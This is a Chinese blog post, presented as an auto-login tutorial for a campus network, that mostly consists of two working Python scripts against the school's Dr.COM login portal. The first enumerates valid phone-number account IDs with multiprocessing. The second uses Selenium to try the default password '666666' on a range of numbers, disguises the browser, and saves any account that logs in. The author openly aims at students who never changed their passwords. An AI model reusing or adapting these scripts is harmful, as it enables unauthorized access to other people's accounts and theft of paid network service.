# 万恶的资本，还我移动校园网😭

校园网的提示简直不能再明显了，再加上59元/月的校园网费，我决定用Python写一个自动登录的脚本。

{% note warning flat %}本教程写于2023年，不知道现在会不会生效，以作参考{% endnote %}


## 前提

我们首先能知道联通手机号码的首位是134、135、136、137、138......
那么我们就能拿到前缀，然后通过正则表达式匹配出手机号码，有些人的安全意识不是很强，嫌麻烦不会修改密码。

## 实现过程

我们使用`Python`的`requests`库对校园网的登录后台发起请求，`check_user`函数用于检查给定的用户ID是否有效，发送HTTP请求并查找返回信息中是否含有指定文本。

```python
import requests
import itertools
import multiprocessing
import os

# 设置请求头信息
url = "http://10.100.10.100/drcom/login"
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36'
}

# 使用会话来复用TCP连接
session = requests.Session()

# 改进检查用户ID是否有效的函数
def validate_userId(userId):
    params = {
        "callback": "dr1003",
        "DDDDD": f"{userId}@unicom",
        "upass": "1",
        "0MKKey": "000",
        "R1": "0",
        "R2": "",
        "R3": "0",
        "R6": "0",
        "para": "00",
        "v6ip": "",
        "terminal_type": "1",
        "lang": "zh-cn",
        "jsVersion": "4.2",
        "v": "6687",
        "lang": "zh"
    }
    valid_ids = []
    try:
        res = session.get(url, params=params, headers=headers).text
        if "userid error1" not in res:
            return userId
        else:
            return None
    except Exception as e:
        print(f"Error for user ID {userId}: {e}")
        return None

def main():
    prefix_list = ["1767399"]  # 创建号码列表
    valid_userIds = []  # 用于存储有效的用户ID
    num_processes = 2  # 创建2个多进程

    # 使用多进程池
    with multiprocessing.Pool(num_processes) as pool:
        results = []
        for suffix in itertools.product(range(0, 10), repeat=4):
            suffix_str = ''.join(map(str, suffix))
            for prefix in prefix_list:
                user_id = f"{prefix}{suffix_str}"
                results.append(pool.apply_async(validate_userId, (user_id,)))
        
        # 等待异步结果
        valid_userIds = [result.get() for result in results if result.get() is not None]

    # 一次性将所有有效的用户ID写入文件
    valid_userIds_path = os.path.join(os.getcwd(), "valid_userId.txt")
    with open(valid_userIds_path, "a") as f:
        for userId in valid_userIds:
            f.write(userId + "\n")

if __name__ == '__main__':
    main()
```

## 代码优化

* 使用`requests.Session()`来减少每次请求都需要建立TCP连接的开销。

* "有效性检查"仅存储有效的`userId`，最后一次性写入，而不是每次发现一个有效ID就写一次，减少磁盘I/O。

* 使用列表解析和`result.get()`直接从异步结果中提取有效用户ID。

## 第二个实现版本`selenium`

我们也可以用Python的另一个强大的自动化库selenium来实现，selenium可以模拟浏览器操作。
我们既然能知道到联通的手机号码前缀，那么我们就可以通过selenium来模拟登录，手动输入密码，然后自动点击登录按钮

```python
import time
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from fake_useragent import UserAgent
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from lxml import etree
import re
import pandas as pd


def match_result(driver, index):
    message = driver.page_source
    login_success = "您已经成功登录" in message
    tree = etree.HTML(message)
    info = tree.xpath('//form[@name="f1"]/div[@class="edit_lobo_cell"]/text()')

    if info:
        data.loc[index, '信息'] = info[0]
    else:
        data.loc[index, '信息'] = '未获取到信息'

    print(info)
    return login_success


def craw_internet(driver, start=150, end=200):
    base_url = 'http://10.100.10.100/'
    for i in range(start, end):
        driver.get(base_url)

        username = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.XPATH, '//form[@name="f3"]//input[@name="DDDDD"]')))
        password = driver.find_element(By.XPATH, '//form[@name="f3"]//input[@name="upass"]')
        button = driver.find_element(By.XPATH, '//form[@name="f3"]//input[@name="0MKKey"]')

        formatted_number = f'1767399{i:04d}'
        print(formatted_number)
        index = len(data)  # 新数据添加的索引位置
        data.loc[index, '账号'] = formatted_number
        data.loc[index, '密码'] = "666666"

        username.clear()
        username.send_keys(formatted_number)
        password.clear()
        password.send_keys("666666")

        button.click()
        time.sleep(2)  # 给予页面加载时间

        if match_result(driver, index):
            data.to_csv('校园网150-200.csv', index=False)
            break  # 成功登录后退出循环
        else:
            try:
                back = WebDriverWait(driver, 5).until(
                    EC.element_to_be_clickable((By.XPATH, '//form[@name="f1"]//input[@name="GobackButton"]')))
                back.click()
            except Exception as e:
                print(f"未找到返回按钮, {e}")


if __name__ == '__main__':
    data = pd.DataFrame(columns=['账号', '密码', '信息'])
    user_agent = UserAgent().random
    options = webdriver.ChromeOptions()
    options.add_argument(f'user-agent={user_agent}')
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    
    service = Service(executable_path='../driver/chromedriver.exe')

    with webdriver.Chrome(service=service, options=options) as driver:
        try:
            craw_internet(driver)
        except Exception as e:
            print(f"发生异常：{e}")
        finally:
            data.to_csv('校园网150-200.csv', index=False)  # 确保数据被保存
```
{% note warning flat %}`craw_internet`的`start`和`end`参数可以设置为任意值，因为这是拼接电话号码的，但是注意不要超过四位数：0-9999{% endnote %}
{% note info flat %}使用selenium库需要安装Chrome浏览器和ChromeDriver驱动，具体可以参考[官方文档](https://selenium-python.readthedocs.io/installation.html){% endnote %}

## 代码优化

* 使用显式等待：通过`WebDriverWait`和`expected_conditions`来等待元素变为可操作的状态，避免了固定等待时间，使代码执行更加高效且具有鲁棒性。

* 更好的异常处理：确保即使在出现异常时，能够保存已收集的数据，并且优雅地关闭`webdriver`。

* 代码的结构调整：将登陆成功的检查逻辑与数据提取逻辑合并到`match_result`函数中，并在`craw_internet`函数内调用，从而简化了代码的逻辑流程。
